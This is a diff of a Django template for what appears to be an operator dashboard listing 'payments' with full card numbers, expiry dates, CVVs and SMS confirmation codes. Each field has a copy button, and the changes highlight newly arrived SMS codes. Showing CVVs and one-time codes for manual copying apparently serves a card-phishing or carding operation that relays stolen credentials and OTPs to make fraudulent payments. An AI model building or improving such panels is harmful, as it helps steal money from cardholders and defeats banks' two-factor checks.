@@ -13,6 +13,13 @@
     {#display: flex;#}
     margin-left: 5px;
 }
+
+.glow {
+        {#font: bold 3em/2em Arial, sans-serif;#}
+        color: #ff0000;
+        text-shadow: 0 0 20px #d000ff;
+
+}
 </style>
 <div class="container-fluid">
 {{ work_data }}
@@ -35,29 +42,33 @@
                  #f6e79e
              {% endif %}
              ;">
-            <div class="col-6">
+            <div class="col-3">
                  № {{ payment.counter }}
             </div>
-                <div class="col-3">
+            <div class="col-6">
+                 {{ payment.create_at }}
+            </div>
+            <div class="col-3">
                  <button name="cancel_payment" value="{{ payment.id }}" style="margin-bottom: 0px; margin-top: -10px; height: 25px;font-size: small" type="submit" class="btn btn-danger btn-sm">X</button>
             </div>
         </div>
-        <div class="card-body" >
+        <div class="card-body" {% if payment.sms_code %} style="background-color: rgba(20,245,255,0.58)"{% endif %}>
             <div class="row" id="amount{{ forloop.counter }}">
                  {{ payment.amount }}<img class="img-thumbnail" onclick="CopyToClipboard('amount{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}">
+
             </div>
             <div class="row" id="card_number{{ forloop.counter }}">
-                 {{ payment.card_number }}<img class="img-thumbnail" onclick="CopyToClipboard('card_number{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}">
+                {{ payment.card_number }}<img class="img-thumbnail" onclick="CopyToClipboard('card_number{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}"><div class="col-4">{{ payment.bank_name }}</div>
             </div>
             <div class="row" id="expired_month{{ forloop.counter }}">
                 {% if payment.expired_month < 10 %}0{%  endif %}{{ payment.expired_month }}/{{ payment.expired_year }}<img class="img-thumbnail" onclick="CopyToClipboard('expired_month{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}">
             </div>
-            <div class="row" id="cvv{{ forloop.counter }}">
+            <div class="row " id="cvv{{ forloop.counter }}">
                  {{ payment.cvv }}<img class="img-thumbnail" onclick="CopyToClipboard('cvv{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}">
             </div>
 
             <div class="row">
-                <div class="col-auto" id="sms_code{{ forloop.counter }}">
+                <div class="col-auto glow" id="sms_code{{ forloop.counter }}">
                      {{ payment.sms_code|default_if_none:"" }}
 
                 </div>
